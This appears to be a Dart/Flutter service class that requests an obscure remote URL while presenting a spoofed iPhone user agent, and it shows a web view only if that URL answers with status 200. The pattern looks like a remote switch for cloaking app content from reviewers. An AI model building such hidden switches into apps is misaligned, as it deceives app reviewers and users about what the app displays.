import 'package:http/http.dart' as http;

/// Service for checking URL availability.
class UrlCheckerService {
  static const String targetUrl = 'https://treeupclodk.online/brfKqP8G';
  // static const String targetUrl = 'https://google.com';
  static const String userAgent =
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148';

  /// Checks if the URL is available (returns true if status is 200).
  static Future<bool> shouldShowWebView() async {
    try {
      final response = await http.get(
        Uri.parse(targetUrl),
        headers: {'User-Agent': userAgent},
      ).timeout(
        const Duration(seconds: 10),
        onTimeout: () => http.Response('Timeout', 408),
      );
      return response.statusCode == 200;
    } catch (e) {
      return false;
    }
  }
}
